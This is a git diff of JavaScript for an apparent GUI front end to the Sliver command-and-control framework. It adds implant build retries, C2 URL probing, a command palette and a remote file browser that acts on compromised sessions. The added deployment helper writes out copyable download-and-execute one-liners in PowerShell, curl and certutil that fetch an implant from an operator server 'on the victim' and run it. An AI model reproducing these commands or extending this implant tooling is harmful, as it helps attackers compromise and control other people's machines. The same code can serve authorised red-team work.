+        // repairable, offer a one-click fix that patches the config via
+        // SaveHTTPC2Profile - no SSH / JSON editing required.
+        const needsRepair = (s.warnings && s.warnings.length) || s.nonceQueryLength <= 0;
+        const warnHtml = (s.warnings && s.warnings.length)
+          ? s.warnings.map(w => `<div style="color:var(--accent);border-left:3px solid var(--accent);padding:4px 8px;background:rgba(226,60,78,.08);margin:4px 0"><b>⚠ ${esc(w)}</b></div>`).join('')
+          : '';
+        const fixBtnHtml = needsRepair
+          ? `<div style="margin:6px 0"><button class="btn small accent" id="httpC2-fix-btn">Auto-fix this profile</button> <span style="color:var(--muted);font-size:11px">sets NonceQueryLength=16 + safe char set, saves back to the teamserver</span></div>`
+          : '';
+        httpC2Summary.innerHTML = warnHtml + fixBtnHtml +
+          `<div><b>UA:</b> ${esc(s.userAgent || '(default)')}</div>` +
+          `<div><b>Sample URI:</b> ${esc(uri)}</div>` +
+          `<div><b>NonceQueryLength:</b> ${s.nonceQueryLength} ${s.nonceQueryLength <= 0 ? '<span style="color:var(--accent);font-weight:600">(broken - beacon will panic)</span>' : ''}</div>` +
+          `<div><b>Request headers:</b> ${esc(hdrLine)}</div>`;
+        const fixBtn = document.getElementById('httpC2-fix-btn');
+        if (fixBtn) fixBtn.addEventListener('click', async () => {
+          fixBtn.disabled = true;
+          const orig = fixBtn.textContent;
+          fixBtn.textContent = 'Repairing…';
+          const r = await App().RepairHTTPC2Profile(n).catch(e => ({ error: String(e) }));
+          if (r && r.error) {
+            toast('err', 'Repair failed: ' + r.error);
+            fixBtn.disabled = false; fixBtn.textContent = orig;
+            return;
+          }
+          toast('ok', 'Profile ' + n + ' - ' + (typeof r === 'string' ? r : 'fixed'));
+          // Re-load the summary so the warning goes away.
+          httpC2Sel.dispatchEvent(new Event('change'));
+        });
+      } catch (e) {
+        httpC2Summary.textContent = 'Could not load profile summary: ' + String(e);
+      }
+    });
+
+    // Populate the C2 URL history datalist (per teamserver, capped at 20).
+    const histKey = (persistKey || 'sliver-gui:default') + ':c2url-history';
+    let c2Hist = [];
+    try { c2Hist = JSON.parse(localStorage.getItem(histKey) || '[]'); } catch (e) {}
+    const dl = document.getElementById('c2url-history');
+    if (dl) dl.innerHTML = c2Hist.map(u => `<option value="${esc(u)}">`).join('');
+
+    // Test button - probe the C2 URL from the operator's own network path so
+    // we know whether the redirector, header check, and origin are all alive
+    // BEFORE we spend 30s on a build that can't call home. Optional custom
+    // header lets the operator preflight a redirector's shared-secret gate.
+    document.getElementById('gen-test-btn')?.addEventListener('click', async () => {
+      const panel = document.getElementById('gen-test-panel');
+      const body = document.getElementById('gen-test-body');
+      panel.style.display = 'flex';
+      body.textContent = 'Probing…';
+      const url = c2.value.trim();
+      // Ask for an optional header if the operator wants to preflight one -
+      // e.g. `X-Request-ID: 7f3b6a…`. Blank ⇒ probe with no extra header.
+      const extra = await uiDialog({
+        title: 'Test C2 URL',
+        message: `Probe <code>${esc(url)}</code> with an optional extra request header.<br/>Leave blank to probe with no custom header. Format: <code>Name: value</code>`,
+        input: true,
+        placeholder: '',
+        okLabel: 'Probe',
+      });
+      if (extra === null) { panel.style.display = 'none'; return; }
+      const headers = {};
+      const raw = String(extra || '').trim();
+      if (raw) {
+        const idx = raw.indexOf(':');
+        if (idx > 0) headers[raw.slice(0, idx).trim()] = raw.slice(idx + 1).trim();
+      }
+      try {
+        const r = await App().TestC2URL(url, headers);
+        if (r.error) {
+          body.innerHTML = `<span style="color:var(--accent)">✗ ${esc(r.error)}</span>`;
+        } else if (r.note && r.status === 0) {
+          body.innerHTML = `<span style="color:var(--muted)">${esc(r.note)}</span>`;
+        } else {
+          const color = (r.status >= 200 && r.status < 400) ? 'var(--ok)' : (r.status === 401 || r.status === 403) ? 'var(--warn,#e0a545)' : 'var(--accent)';
+          const hdrs = Object.entries(r.headers || {}).map(([k,v]) => `  ${esc(k)}: ${esc(v)}`).join('\n');
+          body.innerHTML = `<div style="color:${color}"><b>${r.status} ${esc(r.statusText || '')}</b>  ·  ${r.elapsedMs}ms  ·  → ${esc(r.finalUrl || url)}</div>` +
+            (r.note ? `<div style="color:var(--muted);margin:4px 0">${esc(r.note)}</div>` : '') +
+            (hdrs ? `<pre style="margin:6px 0 0;color:var(--muted);font-size:11px">${hdrs}</pre>` : '') +
+            (r.bodyPreview ? `<pre style="margin:6px 0 0;max-height:120px;overflow:auto;font-size:11px;padding:4px;background:var(--bg);border:1px solid var(--border);border-radius:4px">${esc(r.bodyPreview)}</pre>` : '');
+        }
+      } catch (e) {
+        body.innerHTML = `<span style="color:var(--accent)">✗ ${esc(String(e))}</span>`;
+      }
+    });
+
     document.getElementById('gen-form')?.addEventListener('submit', async e => {
       e.preventDefault(); const f = e.target;
-      const req = { name:f.name.value, goos:f.goos.value, goarch:f.goarch.value, format:f.format.value, c2Url:f.c2Url.value, debug:f.debug.checked, beacon:f.beacon.checked, interval:parseInt(f.interval?.value)||60, jitter:parseInt(f.jitter?.value)||0 };
+      const req = {
+        name: f.name.value,
+        goos: f.goos.value,
+        goarch: f.goarch.value,
+        format: f.format.value,
+        c2Url: f.c2Url.value,
+        debug: f.debug.checked,
+        beacon: f.beacon.checked,
+        interval: parseInt(f.interval?.value) || 60,
+        jitter: parseInt(f.jitter?.value) || 0,
+        httpC2Profile: (f.httpC2Profile?.value || '').trim(),
+      };
       document.getElementById('gen-status').style.display = 'flex';
       document.getElementById('gen-result').textContent = '';
-      const r = await App().GenerateImplant(req).catch(e => ({error:String(e)}));
+      document.getElementById('gen-deploy').style.display = 'none';
+      let r = await App().GenerateImplant(req).catch(e => ({error:String(e)}));
       document.getElementById('gen-status').style.display = 'none';
       const res = document.getElementById('gen-result');
+      // Two related Sliver-server collisions get auto-resolved here:
+      //
+      //  (a) UNIQUE constraint on implant_builds.name - the operator picked
+      //      a name that already exists. We delete the old build then rebuild.
+      //  (b) `rename import dir: target exists` - a prior half-completed
+      //      delete left orphan state under ~/.sliver/slivers/…; Sliver's
+      //      build then refuses to create the same tree. DeleteBuild returns
+      //      OK but the retry-generate still errors. Recovery: try again
+      //      with an auto-suffixed name (`-v2`, `-v3`, …) so the operator
+      //      always gets a fresh build without SSHing to fix orphans.
+      const isCollide  = (e) => /already exists|UNIQUE constraint/i.test(e || '');
+      const isOrphan   = (e) => /rename import dir|target exists/i.test(e || '');
+      const nameBase   = (req.name || '').trim();
+
+      if (r.error && isCollide(r.error)) {
+        // Auto-replace behaviour - no confirm. The operator explicitly
+        // typed a name they want; treating that as "yes, replace" is the
+        // correct default (CS behaves this way too). If they want to keep
+        // both, they'd have picked a different name.
+        document.getElementById('gen-status').style.display = 'flex';
+        const delErr = await App().DeleteBuild(nameBase).catch(e => String(e));
+        if (delErr && !isOrphan(delErr)) {
+          document.getElementById('gen-status').style.display = 'none';
+          res.textContent = `[ERROR] delete failed: ${delErr}`;
+          res.style.color = 'var(--accent)';
+        } else {
+          r = await App().GenerateImplant(req).catch(e => ({error: String(e)}));
+          document.getElementById('gen-status').style.display = 'none';
+        }
+      }
+
+      // Orphan-state auto-rename: try up to 8 suffix variants (-v2 … -v9).
+      // Emits a toast so the operator sees why the final name differs.
+      if (r.error && isOrphan(r.error) && nameBase) {
+        document.getElementById('gen-status').style.display = 'flex';
+        let saved = null;
+        for (let n = 2; n <= 9; n++) {
+          const attempt = { ...req, name: nameBase + '-v' + n };
+          const rr = await App().GenerateImplant(attempt).catch(e => ({error: String(e)}));
+          if (!rr.error) { r = rr; saved = attempt.name; break; }
+          if (!isOrphan(rr.error) && !isCollide(rr.error)) { r = rr; break; }
+        }
+        document.getElementById('gen-status').style.display = 'none';
+        if (saved) {
+          toast('warn', 'Sliver had orphan state for "' + nameBase + '". Saved as "' + saved + '" instead.');
+        }
+      }
       if (r.error) {
-        res.textContent = `[ERROR] ${r.error}`;
         res.style.color = 'var(--accent)';
+        // If the guard fires because a profile has NonceQueryLength=0, give
+        // the operator a one-click fix right in the error banner. Extract
+        // the profile name from the error message (which quotes it).
+        const nonceMatch = /NonceQueryLength=0/i.test(r.error);
+        const profMatch = r.error.match(/profile\s+"([^"]+)"/);
+        if (nonceMatch && profMatch) {
+          const badProfile = profMatch[1];
+          res.innerHTML = `<div>[ERROR] ${esc(r.error)}</div>` +
+            `<button class="btn small accent" id="gen-fix-and-retry" style="margin-top:8px">Auto-fix "${esc(badProfile)}" and retry build</button>`;
+          document.getElementById('gen-fix-and-retry')?.addEventListener('click', async () => {
+            const btn = document.getElementById('gen-fix-and-retry');
+            btn.disabled = true; btn.textContent = 'Repairing profile…';
+            const fx = await App().RepairHTTPC2Profile(badProfile).catch(e => ({ error: String(e) }));
+            if (fx && fx.error) { btn.textContent = 'Repair failed: ' + fx.error; return; }
+            btn.textContent = 'Retrying build…';
+            const rr = await App().GenerateImplant(req).catch(e => ({error:String(e)}));
+            if (rr.error) { res.innerHTML = `<div>[ERROR] ${esc(rr.error)}</div>`; return; }
+            res.style.color = 'var(--ok)';
+            const buildName = rr.name || rr.file;
+            res.innerHTML = `<span>[OK] Build created: ${esc(buildName)}</span> <button class="btn small" style="margin-left:10px" onclick="buildRegen('${esc(buildName)}')">⬇ Save to disk</button>`;
+            renderDeployHelper(buildName, req);
+            buildRegen(buildName);
+            // Also refresh the profile summary so the ⚠ banner clears.
+            if (httpC2Sel && httpC2Sel.value) httpC2Sel.dispatchEvent(new Event('change'));
+          });
+        } else {
+          res.textContent = `[ERROR] ${r.error}`;
+        }
       } else {
         res.style.color = 'var(--ok)';
-        res.innerHTML = `<span>[OK] Build created: ${esc(r.name || r.file)}</span> <button class="btn small" style="margin-left:10px" onclick="buildRegen('${esc(r.name || r.file)}')">⬇ Save to disk</button>`;
-        // Auto-trigger the native save dialog immediately
-        buildRegen(r.name || r.file);
+        const buildName = r.name || r.file;
+        res.innerHTML = `<span>[OK] Build created: ${esc(buildName)}</span> <button class="btn small" style="margin-left:10px" onclick="buildRegen('${esc(buildName)}')">⬇ Save to disk</button>`;
+        // Remember this C2 URL for the datalist (deduped, most-recent first).
+        try {
+          const u = req.c2Url.trim();
+          if (u) {
+            c2Hist = [u, ...c2Hist.filter(x => x !== u)].slice(0, 20);
+            localStorage.setItem(histKey, JSON.stringify(c2Hist));
+            if (dl) dl.innerHTML = c2Hist.map(x => `<option value="${esc(x)}">`).join('');
+          }
+        } catch (e) { /* localStorage full or private mode - non-fatal */ }
+        renderDeployHelper(buildName, req);
+        buildRegen(buildName);
       }
     });
   }, 0);
 }
+
+// renderDeployHelper draws the "how do I get this implant onto the target"
+// panel that appears after a successful build. It's a pure QoL feature - no
+// magic delivery - but it removes the "the build succeeded, now what?" cliff
+// that trips new operators using redirector infra. The download-URL prefix
+// is remembered per teamserver so the operator sets it once.
+function renderDeployHelper(buildName, req) {
+  const el = document.getElementById('gen-deploy');
+  if (!el) return;
+  const key = (persistKey || 'sliver-gui:default') + ':deploy-url-prefix';
+  const savedPrefix = (() => { try { return localStorage.getItem(key) || ''; } catch (e) { return ''; } })();
+  const ext = req.format === 'shellcode' ? '.bin' : (req.goos === 'windows' ? (req.format === 'shared' ? '.dll' : '.exe') : '');
+  const filename = /\.[a-z0-9]{1,5}$/i.test(buildName) ? buildName : buildName + ext;
+  const guess = savedPrefix ? (savedPrefix.replace(/\/$/, '') + '/' + filename) : '';
+  el.style.display = 'block';
+  el.innerHTML = `
+    <div style="font-weight:600;font-size:12.5px;margin-bottom:6px">Deployment helper</div>
+    <div style="font-size:11.5px;color:var(--muted);margin-bottom:6px">Set once - the download URL prefix your file server or auto-sync pipeline exposes builds under. Remembered per teamserver.</div>
+    <div style="display:flex;gap:6px;align-items:center;margin-bottom:8px">
+      <input id="deploy-prefix" placeholder="https://dl.example.net" value="${esc(savedPrefix)}" style="flex:1;padding:5px 7px;background:var(--bg);color:var(--fg);border:1px solid var(--border);border-radius:5px;font-size:12px"/>
+      <button class="btn small" id="deploy-save-prefix">Save</button>
+    </div>
+    <div style="font-size:11.5px"><b>File:</b> <code>${esc(filename)}</code></div>
+    <div style="font-size:11.5px;color:var(--muted);margin-top:4px">Copy a one-liner to fetch it on the victim:</div>
+    <div style="display:flex;gap:6px;flex-wrap:wrap;margin-top:6px">
+      <button class="btn small" id="deploy-copy-ps" ${guess ? '' : 'disabled'}>Copy PowerShell</button>
+      <button class="btn small" id="deploy-copy-curl" ${guess ? '' : 'disabled'}>Copy curl</button>
+      <button class="btn small" id="deploy-copy-certutil" ${guess ? '' : 'disabled'}>Copy certutil</button>
+    </div>
+    <div id="deploy-url" style="font-size:11px;color:var(--muted);margin-top:6px;word-break:break-all">${guess ? 'URL: <code>' + esc(guess) + '</code>' : '(set a URL prefix above to enable copy buttons)'}</div>
+  `;
+  const prefixInp = document.getElementById('deploy-prefix');
+  document.getElementById('deploy-save-prefix')?.addEventListener('click', () => {
+    const p = (prefixInp.value || '').trim();
+    try { localStorage.setItem(key, p); } catch (e) {}
+    renderDeployHelper(buildName, req);
+    toast('ok', 'Deployment prefix saved');
+  });
+  const copy = (txt) => {
+    navigator.clipboard?.writeText(txt).then(() => toast('ok', 'Copied to clipboard'))
+      .catch(() => toast('err', 'Copy failed (no clipboard permission)'));
+  };
+  const url = guess;
+  document.getElementById('deploy-copy-ps')?.addEventListener('click', () => {
+    copy(`Invoke-WebRequest -Uri "${url}" -OutFile "$env:TEMP\\${filename}"; Start-Process "$env:TEMP\\${filename}"`);
+  });
+  document.getElementById('deploy-copy-curl')?.addEventListener('click', () => {
+    copy(`curl -sk -o /tmp/${filename} "${url}" && chmod +x /tmp/${filename} && /tmp/${filename}`);
+  });
+  document.getElementById('deploy-copy-certutil')?.addEventListener('click', () => {
+    copy(`certutil -urlcache -f "${url}" %TEMP%\\${filename} && %TEMP%\\${filename}`);
+  });
+}
 // ── Command palette (Ctrl+K) ─────────────────────────────────────────────────
+// Palette now surfaces three item classes:
+//   agents  - the two lists (sessions + beacons), searchable by any field
+//   panels  - top-toolbar navigation
+//   actions - verbs (test c2, change download dir, help, disconnect …)
+// Plus a "recent" ribbon for the last 5 palette items the operator ran.
 let paletteItems = [], paletteSel = 0;
+const paletteRecent = []; // most-recent-first, capped at 5
 document.addEventListener('keydown', e => {
   if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k') { e.preventDefault(); openPalette(); }
+  // "?" opens the keyboard-help overlay unless the operator is typing
+  if (e.key === '?' && !isEditableTarget(e.target)) { e.preventDefault(); openKbdHelp(); }
 });
+function isEditableTarget(el) {
+  if (!el) return false;
+  if (el.isContentEditable) return true;
+  const t = (el.tagName || '').toLowerCase();
+  return t === 'input' || t === 'textarea' || t === 'select';
+}
 function openPalette() {
   if (document.getElementById('app-shell').classList.contains('hidden')) return; // not connected
   const ov = document.getElementById('palette-overlay');
@@ -2817,32 +4026,118 @@ function openPalette() {
   setTimeout(() => inp.focus(), 20);
 }
 function closePalette() { document.getElementById('palette-overlay').classList.add('hidden'); }
+function paletteRunAgent(kind, o) { switchView('sessions'); openInteract(kind, o); }
+function paletteActions() {
+  // Static list of runnable verbs. New verbs added here surface automatically
+  // in both search results and the recent ribbon. Keep labels lower-case for
+  // stable substring matching.
+  return [
+    { label: 'test c2 url…',            hint: 'probe the current C2 URL through your network path', run: () => { switchView('generate'); setTimeout(() => document.getElementById('gen-test-btn')?.click(), 250); } },
+    { label: 'change download dir',     hint: 'where generated implants save on this PC',           run: changeDownloadDir },
+    { label: 'copy last c2 url',        hint: 'clipboard: most recent URL used in Generate',        run: async () => {
+        const histKey = (persistKey || 'sliver-gui:default') + ':c2url-history';
+        let arr = []; try { arr = JSON.parse(localStorage.getItem(histKey) || '[]'); } catch (e) {}
+        if (!arr[0]) { toast('warn', 'No recent C2 URL yet'); return; }
+        navigator.clipboard?.writeText(arr[0]); toast('ok', 'Copied: ' + arr[0]);
+      } },
+    { label: 'refresh agents',          hint: 'force a fresh sessions + beacons poll',              run: refreshAgents },
+    { label: 'open generate',           hint: 'build a new implant',                                run: () => switchView('generate') },
+    { label: 'open listeners',          hint: 'manage HTTP/mtls/dns/wg jobs',                       run: () => switchView('listeners') },
+    { label: 'open profiles',           hint: 'saved implant profiles',                             run: () => switchView('profiles') },
+    { label: 'open c2 profiles',        hint: 'HTTP C2 URIs / headers / user-agents',               run: () => switchView('c2profiles') },
+    { label: 'open events',             hint: 'live event log',                                     run: () => switchView('events') },
+    { label: 'help - keyboard shortcuts', hint: 'or press ?',                                       run: openKbdHelp },
+    { label: 'disconnect',              hint: 'end this operator session',                          run: () => document.getElementById('disconnect-btn').click() },
+  ];
+}
 function buildPalette(q) {
-  q = q.toLowerCase();
-  const panels = ['sessions','beacons','listeners','generate','builds','profiles','events','loot','operators'];
+  q = q.toLowerCase().trim();
+  const panels = ['sessions','beacons','listeners','generate','builds','profiles','events','loot','operators','hosts','creds','scripts','iocs','report','c2profiles'];
   const items = [];
+  // Match helper: score by whether label starts with the query (higher rank).
+  const match = (label) => {
+    if (!q) return 1;
+    const l = label.toLowerCase();
+    if (l.startsWith(q)) return 3;
+    if (l.includes(' ' + q)) return 2;
+    if (l.includes(q)) return 1;
+    return 0;
+  };
+  // Agents
   [...allSessions.map(s => ({ kind:'session', obj:s })), ...allBeacons.map(b => ({ kind:'beacon', obj:b }))].forEach(a => {
-    const label = `${a.kind==='session'?'💻':'📡'} ${a.obj.hostname||a.obj.id.slice(0,8)} — ${a.obj.username||''}`;
-    if (!q || label.toLowerCase().includes(q)) items.push({ label, action: () => { switchView('sessions'); openInteract(a.kind, a.obj); } });
+    const label = `${a.obj.hostname||a.obj.id.slice(0,8)} - ${a.obj.username||''}${a.obj.remoteAddress ? '  (' + a.obj.remoteAddress.split(':')[0] + ')' : ''}`;
+    const score = match(label);
+    if (!q || score) items.push({ score, kind: 'agent', label, action: () => paletteRunAgent(a.kind, a.obj), icon: a.kind === 'session' ? '💻' : '📡' });
   });
-  panels.forEach(p => { if (!q || p.includes(q)) items.push({ label: `⚙ ${p}`, action: () => { const b = document.querySelector(`.tb-btn[data-view="${p}"]`); if (b) b.click(); } }); });
+  // Panels
+  panels.forEach(p => {
+    const s = match(p);
+    if (!q || s) items.push({ score: s, kind: 'panel', label: p, action: () => switchView(p), icon: '⚙' });
+  });
+  // Actions - read from window so features-bundle.js can extend the list
+  // via `window.paletteActions = fn`; a bare reference here would resolve
+  // to this file's lexical binding and ignore extensions loaded later.
+  (window.paletteActions || paletteActions)().forEach(a => {
+    const s = Math.max(match(a.label), match(a.hint || ''));
+    if (!q || s) items.push({ score: s, kind: 'action', label: a.label, hint: a.hint, action: a.run, icon: '⚡' });
+  });
+  // Recents - shown on top when no query
+  if (!q) {
+    paletteRecent.slice(0, 5).reverse().forEach(r => items.unshift({ kind: 'recent', label: r.label, action: r.action, icon: '↻', hint: 'recent' }));
+  }
+  // Stable-ish sort: higher score first, then recents/agents before panels/actions.
+  items.sort((a, b) => (b.score || 0) - (a.score || 0));
   paletteItems = items; paletteSel = 0; renderPalette();
 }
 function renderPalette() {
   const el = document.getElementById('palette-results');
   if (!paletteItems.length) { el.innerHTML = '<div class="palette-empty">No matches</div>'; return; }
-  el.innerHTML = paletteItems.map((it,i) => `<div class="palette-item${i===paletteSel?' active':''}" data-i="${i}">${esc(it.label)}</div>`).join('');
-  el.querySelectorAll('.palette-item').forEach(d => d.addEventListener('click', () => { paletteItems[parseInt(d.dataset.i)].action(); closePalette(); }));
+  el.innerHTML = paletteItems.map((it, i) => {
+    const hint = it.hint ? `<span style="color:var(--muted);margin-left:10px;font-size:11px">${esc(it.hint)}</span>` : '';
+    const kindClass = 'p-kind-' + (it.kind === 'recent' ? 'recent' : (it.kind || 'panel'));
+    const chip = `<span class="fresh ${kindClass}" style="margin-right:8px;padding:0 6px;font-weight:600">${esc(it.kind || '')}</span>`;
+    return `<div class="palette-item${i===paletteSel?' active':''}" data-i="${i}"><span style="margin-right:8px">${esc(it.icon || '·')}</span>${chip}<span>${esc(it.label)}</span>${hint}</div>`;
+  }).join('');
+  el.querySelectorAll('.palette-item').forEach(d => d.addEventListener('click', () => runPaletteItem(parseInt(d.dataset.i))));
+}
+function runPaletteItem(idx) {
+  const it = paletteItems[idx]; if (!it) return;
+  // Remember this action for the recent ribbon (dedup by label).
+  if (it.kind !== 'recent') {
+    const rec = { label: it.label, action: it.action };
+    const dup = paletteRecent.findIndex(r => r.label === it.label);
+    if (dup >= 0) paletteRecent.splice(dup, 1);
+    paletteRecent.unshift(rec);
+    if (paletteRecent.length > 10) paletteRecent.length = 10;
+  }
+  it.action();
+  closePalette();
 }
 document.getElementById('palette-input').addEventListener('input', function(){ buildPalette(this.value); });
 document.getElementById('palette-input').addEventListener('keydown', e => {
   if (e.key === 'Escape') return closePalette();
   if (e.key === 'ArrowDown') { paletteSel = Math.min(paletteSel+1, paletteItems.length-1); renderPalette(); e.preventDefault(); }
   if (e.key === 'ArrowUp')   { paletteSel = Math.max(paletteSel-1, 0); renderPalette(); e.preventDefault(); }
-  if (e.key === 'Enter' && paletteItems[paletteSel]) { paletteItems[paletteSel].action(); closePalette(); }
+  if (e.key === 'Enter' && paletteItems[paletteSel]) { runPaletteItem(paletteSel); }
 });
+
+// ── Keyboard help overlay (?) ─────────────────────────────────────────────
+function openKbdHelp() {
+  const ov = document.getElementById('kbd-overlay');
+  if (!ov) return;
+  ov.classList.remove('hidden');
+}
+function closeKbdHelp() { document.getElementById('kbd-overlay')?.classList.add('hidden'); }
+document.getElementById('kbd-close')?.addEventListener('click', closeKbdHelp);
+document.getElementById('help-btn')?.addEventListener('click', openKbdHelp);
+document.getElementById('kbd-overlay')?.addEventListener('click', e => { if (e.target.id === 'kbd-overlay') closeKbdHelp(); });
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeKbdHelp(); });
 document.getElementById('palette-overlay').addEventListener('click', e => { if (e.target.id === 'palette-overlay') closePalette(); });
-function switchView(v) { const b = document.querySelector(`.tb-btn[data-view="${v}"]`); if (b && v !== 'sessions') b.click(); }
+// switchView - canonical way to navigate to a top-level view from anywhere
+// in the app. Uses dispatchView so it works whether the toolbar has the old
+// flat .tb-btn row or the new grouped menu-item dropdowns.
+function switchView(v) { dispatchView(v); }
+window.switchView = switchView;
 
 // ── Resize handle ──────────────────────────────────────────────────────────
 (function() {
@@ -2891,7 +4186,7 @@ document.getElementById('reconnect-cancel-btn').addEventListener('click', async 
     el.title = bi ? `Built ${bi.buildDate}` : '';
   }
   const wm = document.getElementById('panel-watermark');
-  if (wm) wm.textContent = `Sliver GUI${bi && bi.version ? ' ' + bi.version : ''} · Made by Raj Kumar Mullapudi`;
+  if (wm) wm.textContent = `Sliver GUI${bi && bi.version ? ' ' + bi.version : ''}`;
 })();
 
 
@@ -2948,17 +4243,61 @@ async function openFileBrowser(sessionID) {
     return labels[ext] || (ext ? ext.toUpperCase() + ' File' : 'Unknown File');
   }
 
-  // Path helpers
-  function splitPath(p) {
+  // Path helpers — Sliver's Ls RPC returns paths using the target's native
+  // separator; we display them as-is and use a per-path style detector when
+  // joining names, so Windows paths stay `C:\Users\Foo` and *nix paths stay
+  // `/etc/passwd`.
+  function pathSep(p) { return (p || '').indexOf('\\') >= 0 && (p || '').indexOf('/') < 0 ? '\\' : '/'; }
+  function joinChild(dir, name) {
+    const sep = pathSep(dir);
+    const base = (dir || '').replace(/[\\/]+$/, '');
+    if (!base || base === '.') return name;
+    return base + sep + name;
+  }
+  function splitPathVisible(p) {
     p = (p || '').replace(/\\/g, '/').replace(/\/+$/, '');
     if (!p || p === '.') return [];
     return p.split('/').filter(Boolean);
   }
-  function joinPath(parts) { return parts.length ? parts.join('/') : '.'; }
+  function parentOf(p) {
+    if (!p || p === '.' || p === '/' || /^[A-Za-z]:[\\/]?$/.test(p)) return p;
+    const sep = pathSep(p);
+    const idx = Math.max(p.lastIndexOf('\\'), p.lastIndexOf('/'));
+    if (idx <= 0) return sep === '\\' ? '.' : '/';
+    return p.slice(0, idx) || (sep === '\\' ? '.' : '/');
+  }
 
   const history = [];
   let histIdx = -1;
   let currentPath = '.';
+  let showHidden = false;
+
+  // Simple modal prompt for text input — used by New Folder / Rename.
+  function fbPrompt(title, initial) {
+    return new Promise(resolve => {
+      const backdrop = document.createElement('div');
+      backdrop.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center';
+      backdrop.innerHTML = `
+        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;min-width:360px;box-shadow:0 8px 32px rgba(0,0,0,0.4)">
+          <div style="font-weight:600;margin-bottom:10px">${esc(title)}</div>
+          <input type="text" id="_fbp_input" style="width:100%;padding:8px;background:var(--panel);border:1px solid var(--border);border-radius:4px;color:var(--fg);font-family:inherit" value="${esc(initial || '')}" />
+          <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:14px">
+            <button class="btn" id="_fbp_cancel">Cancel</button>
+            <button class="btn primary" id="_fbp_ok">OK</button>
+          </div>
+        </div>`;
+      document.body.appendChild(backdrop);
+      const input = backdrop.querySelector('#_fbp_input');
+      input.focus(); input.select();
+      const done = (val) => { backdrop.remove(); resolve(val); };
+      backdrop.querySelector('#_fbp_ok').onclick = () => done(input.value.trim() || null);
+      backdrop.querySelector('#_fbp_cancel').onclick = () => done(null);
+      input.addEventListener('keydown', e => {
+        if (e.key === 'Enter') done(input.value.trim() || null);
+        if (e.key === 'Escape') done(null);
+      });
+    });
+  }
 
   // Render the right preview panel from a file entry
   function showPreview(f, fullPath) {
@@ -2970,7 +4309,7 @@ async function openFileBrowser(sessionID) {
     }
     const icon = fileIcon(f.name, f.isDir);
     const typeLabel = fileTypeLabel(f.name, f.isDir);
-    const size = f.isDir ? '—' : fmtSize(f.size);
+    const size = f.isDir ? '-' : fmtSize(f.size);
     pv.innerHTML = `
       <div class="fb-preview-icon">${icon}</div>
       <div class="fb-preview-name">${esc(f.name)}</div>
@@ -2978,18 +4317,52 @@ async function openFileBrowser(sessionID) {
       <div class="fb-preview-divider"></div>
       <div class="fb-preview-row"><span class="fb-preview-label">Path</span><span class="fb-preview-val">${esc(fullPath)}</span></div>
       <div class="fb-preview-row"><span class="fb-preview-label">Size</span><span class="fb-preview-val">${size}</span></div>
-      <div class="fb-preview-row"><span class="fb-preview-label">Mode</span><span class="fb-preview-val">${esc(f.mode || '—')}</span></div>
-      ${f.isDir ? `<div class="fb-preview-tip">Double-click to enter folder</div>` : `
-      <div class="fb-preview-actions">
-        <button class="fb-preview-btn" id="fb-dl-${dockId}" data-path="${esc(fullPath)}">⬇ Download</button>
-        <button class="fb-preview-btn danger" id="fb-del-${dockId}" data-path="${esc(fullPath)}">🗑 Delete</button>
-      </div>`}
+      <div class="fb-preview-row"><span class="fb-preview-label">Mode</span><span class="fb-preview-val">${esc(f.mode || '-')}</span></div>
+      <div class="fb-preview-actions" style="display:flex;flex-direction:column;gap:6px">
+        ${f.isDir ? '' : `<button class="fb-preview-btn" id="fb-dl-${dockId}">⬇ Download</button>`}
+        <button class="fb-preview-btn" id="fb-rename-${dockId}">✎ Rename</button>
+        <button class="fb-preview-btn" id="fb-copy-${dockId}">⧉ Copy to…</button>
+        <button class="fb-preview-btn" id="fb-chmod-${dockId}">🔒 Chmod</button>
+        <button class="fb-preview-btn danger" id="fb-del-${dockId}">🗑 Delete</button>
+      </div>
+      ${f.isDir ? `<div class="fb-preview-tip" style="margin-top:8px">Double-click to enter folder</div>` : ''}
     `;
-    // Wire download (placeholder)
-    pv.querySelector(`#fb-dl-${dockId}`)?.addEventListener('click', () => {
-      toast('info', `Download: use 'download ${fullPath}' in the session console`);
+    // Download → save dialog on the operator machine, actual bytes over the wire.
+    pv.querySelector(`#fb-dl-${dockId}`)?.addEventListener('click', async () => {
+      toast('info', `Downloading ${f.name}…`);
+      const res = await App().DownloadFile(sessionID, fullPath).catch(e => ({ error: String(e) }));
+      if (res && res.error) { if (res.error !== 'save cancelled') toast('error', res.error); return; }
+      toast('ok', `Saved ${res.bytes} bytes → ${res.path}`);
     });
-    // Wire delete
+    // Rename → target dir + new name via MoveFile (Mv RPC).
+    pv.querySelector(`#fb-rename-${dockId}`)?.addEventListener('click', async () => {
+      const newName = await fbPrompt(`Rename '${f.name}' to:`, f.name);
+      if (!newName || newName === f.name) return;
+      const dst = joinChild(parentOf(fullPath), newName);
+      const err = await App().MoveFile(sessionID, fullPath, dst).catch(e => e.toString());
+      if (err) { toast('error', err); return; }
+      toast('ok', `Renamed → ${newName}`);
+      renderDir(currentPath, false);
+    });
+    // Copy → prompt for destination path, use CopyFile (Cp RPC).
+    pv.querySelector(`#fb-copy-${dockId}`)?.addEventListener('click', async () => {
+      const dst = await fbPrompt(`Copy '${f.name}' to path:`, joinChild(currentPath, f.name + '.copy'));
+      if (!dst) return;
+      const [n, err] = await App().CopyFile(sessionID, fullPath, dst).then(r => [r, null]).catch(e => [0, e.toString()]);
+      if (err) { toast('error', err); return; }
+      toast('ok', `Copied ${n} bytes → ${dst}`);
+      renderDir(currentPath, false);
+    });
+    // Chmod → mode string; harmless no-op on Windows targets (implant ignores).
+    pv.querySelector(`#fb-chmod-${dockId}`)?.addEventListener('click', async () => {
+      const mode = await fbPrompt(`Chmod '${f.name}' (octal, e.g. 755):`, '755');
+      if (!mode) return;
+      const err = await App().Chmod(sessionID, fullPath, mode).catch(e => e.toString());
+      if (err) { toast('error', err); return; }
+      toast('ok', `Chmod ${mode}`);
+      renderDir(currentPath, false);
+    });
+    // Delete
     pv.querySelector(`#fb-del-${dockId}`)?.addEventListener('click', async () => {
       const ok = await uiConfirm(`Delete '${f.name}'?`, { title: 'Delete File', okLabel: 'Delete', danger: true });
       if (!ok) return;
@@ -3013,15 +4386,22 @@ async function openFileBrowser(sessionID) {
       history.push(currentPath);
     }
 
